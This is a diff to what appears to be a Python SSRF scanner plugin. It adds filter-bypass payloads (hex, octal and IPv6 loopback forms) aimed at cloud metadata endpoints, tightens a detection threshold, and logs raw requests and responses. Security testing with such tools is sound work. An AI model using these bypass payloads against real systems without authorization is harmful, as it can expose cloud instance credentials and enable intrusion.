@@ -12,6 +12,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from menu import C
 from plugins import ensure_outdir
 from ..output import info, success, warn, error
+from ..http_utils import format_http_request, format_http_response
 
 # V10.3: Payloads nativos de metadata cloud + bypass
 METADATA_PAYLOADS = [
@@ -35,6 +36,10 @@ METADATA_PAYLOADS = [
     ("http://169.254.169.254/opc/v1/instance/", ["availabilityDomain", "compartmentId"]),
     # Alibaba Cloud
     ("http://100.100.100.200/latest/meta-data/", ["instance-id", "hostname"]),
+    # V11: Bypass payloads adicionais
+    ("http://0x7f000001/latest/meta-data/", ["ami-id", "instance-id"]),      # Hex IP (127.0.0.1)
+    ("http://0177.0.0.1/latest/meta-data/", ["ami-id", "instance-id"]),      # Octal IP
+    ("http://[::]/latest/meta-data/", ["ami-id", "instance-id"]),            # IPv6 unspecified
 ]
 
 # V10.3: Bypass payloads para filtros de URL
@@ -98,7 +103,8 @@ def _test_ssrf_native(url: str, param_name: str) -> list:
                     matched_markers = [m for m in markers if m.lower() in body and m.lower() not in baseline_body]
 
                     # Confirmação extra: body deve ser significativamente diferente do baseline
-                    if matched_markers and abs(len(resp.text) - baseline_len) > 200:
+                    # V11: Threshold aumentado para 500 bytes (reduz FP de páginas dinâmicas)
+                    if matched_markers and abs(len(resp.text) - baseline_len) > 500:
                         findings.append({
                             "url": url,
                             "test_url": test_url,
@@ -109,6 +115,8 @@ def _test_ssrf_native(url: str, param_name: str) -> list:
                             "matched_markers": matched_markers,
                             "details": f"SSRF Nativo: Metadata cloud detectado no response ({', '.join(matched_markers)})",
                             "action": "Confirmar manualmente: acesse a URL e verifique se os dados de metadata são reais.",
+                            "request_raw": format_http_request(resp.request),
+                            "response_raw": format_http_response(resp),
                         })
                         return findings  # Um achado por parâmetro basta
 
@@ -277,7 +285,7 @@ def run(context: dict):
                     from ..http_utils import throttle
                     throttle()
                     try: httpx.get(url, verify=False, timeout=5)
-                    except: pass
+                    except Exception: pass
                     
                 with ThreadPoolExecutor(max_workers=10) as executor:
                     for u in injected_urls:
